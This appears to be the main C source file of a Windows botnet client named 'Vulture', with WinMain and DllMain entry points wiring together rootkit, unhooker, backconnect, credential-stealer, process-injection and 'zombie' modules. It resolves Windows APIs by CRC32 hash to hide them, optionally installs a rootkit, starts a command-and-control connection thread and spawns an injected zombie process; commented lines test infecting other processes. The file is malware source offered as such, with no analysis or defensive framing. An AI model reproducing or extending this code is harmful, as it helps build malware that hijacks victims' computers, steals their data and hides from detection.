#include "../common/bot_structs.h"
#include "../common/api.h"
#include "../common/mem.h"
#include "../common/string.h"
#include "../common/utils.h"

#include "zombie.h"
#include "connection.h"
#include "install.h"
#include "os_info.h"
#include "inject.h"
#include "modules.h"
bot_t bot;

#ifdef MODULE_ROOTKIT
#include "rootkit.h"
#include "unhooker.h"
#endif

#ifdef MODULE_BACKCONNECT
#include "backconnect.h"
#endif

// #ifdef MODULE_STEALERS
// #include "stealers.h"
// #endif

#ifdef MODULE_DEBUG
#include "debug.h"
#endif

BOOL WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd)
{
#ifdef DEBUG
	LPSTR pszShit;
	LPWSTR pwzShit;
	DWORD dwHash;
	//ChromeAccounts* Accounts;
	int i;
#endif
	//bot.crc.crc32Initialized = FALSE;

#ifdef DEBUG
	pszShit = "CreateDirectoryW";
	dwHash = crc32Hash(pszShit, lstrlenA(pszShit));
	
	//pwzShit = L"shlwapi.dll";
	//dwHash = crc32Hash(pwzShit, lstrlenW(pwzShit) * 2);
#endif
	
	bot.crc.crc32Initialized = FALSE;
	
#ifdef MODULE_DEBUG
	InitDebug();
#endif
	if (!InitializeAPI())
	{
		return TRUE;
	}

	bot.hLocal = bot.api.pGetModuleHandleW(NULL);

 	bot.api.pGetModuleFileNameW(NULL, bot.wzBotPath, 255);

	/*
	if (!IsSystemInfected(&bot))
	{
		InstallVulture(&bot);

		return FALSE;
	}
	*/

#ifdef DEBUG
#ifdef MODULE_ROOTKIT
	InstallRootkit();
#endif
#endif

	//StartConnectionThread(&bot);
#if defined DEBUG
	StartConnectionThread();

	while (TRUE)
	{
		bot.api.pSleep(1000);
	}
#else

	CreateZombie();


#endif

	bot.api.pExitProcess(0);
// 	if (!CreateZombie(&bot))
// 	{
// 		MessageBox(0, 0, 0, 0);
// 	}

// 
// 	DWORD i = InjectBot((void*)VultureEntryPoint, (PBYTE)VultureEntryPointEnd - (PBYTE)VultureEntryPoint);
// 
// 	if (i > 0)
// 		MessageBox(0, "A process was infected!", 0, 0);
// 	else MessageBox(0, "No processes were infected!", 0, 0);
// 
// 	LPWSTR pwzExplorer = L"user32.dll";
// 	DWORD dwLength = StrLengthW(pwzExplorer) * 2;
// 
// 	DWORD dwHash = crc32Hash(pwzExplorer, dwLength);

	//CreateZombie();

// 	while (!CreateZombie())
// 		CWA(Sleep)(1000);

// 	if (!CreateZombie())
// 	{
		//MessageBox(0, "Zombie failed.", 0, 0);
/*	}*/
// 
// 	LPSTR pwzGetWindowsDirectoryW = "GetSystemDirectoryW";
// 	DWORD dwHash = crc32Hash(pwzGetWindowsDirectoryW, StrLengthA(pwzGetWindowsDirectoryW));
// 	
// 	BOOL bIs64 = IsOperatingSystem64Bit();


	//LPWSTR pwz = GetSystem32Dir(&g_Bot);

	
	return FALSE;
}

BOOL WINAPI DllMain(
					_In_ HINSTANCE hinstDLL,
					_In_ DWORD     fdwReason,
					_In_ LPVOID    lpvReserved
					)
{
	switch(fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		//MessageBoxA(0, "test", "test", 0);
		bot = *(bot_t*)lpvReserved;
		MessageBoxW(0, bot.wzBotPath, 0, 0);
		//memzero(&bot, sizeof(bot_t));

#ifndef DEBUG
		if(lpvReserved != NULL)
			bot = *(bot_t*)lpvReserved;
#endif

		if(bot.IsZombie)
			ZombieEntryPoint(&bot);
		else dwOtherEntryPoint(&bot);
		break;
	}
	return TRUE;
}